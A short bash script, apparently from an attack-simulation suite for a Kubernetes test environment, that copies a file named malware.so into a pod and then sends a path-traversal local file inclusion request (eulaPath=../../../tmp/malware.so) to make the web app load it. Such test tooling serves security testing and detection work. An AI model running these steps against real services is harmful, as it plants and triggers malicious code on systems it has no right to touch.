#!/usr/bin/env bash

source "$(dirname "$0")/general.sh"

echo "[+] Testing LFI on ${service_map[secure-python-app]} to a malicious file"

kubectl cp "$(dirname "$0")/malware.so" $(kubectl -n attack-suite get pod -l app=secure-python-app -o jsonpath='{.items[0].metadata.name}'):/tmp/malware.so -n attack-suite
if [ $? -ne 0 ]; then
    echo "[-] Failed to copy malware.so to the pod"
    exit 1
fi

curl -s "http://${service_map[secure-python-app]}/eula.php?eulaPath=../../../tmp/malware.so" \
  --insecure -o /dev/null
if [ $? -eq 0 ]; then
    echo "[+] LFI payload sent successfully to the malicious file"
else
    echo "[-] LFI payload failed to send"
    exit 1
fi

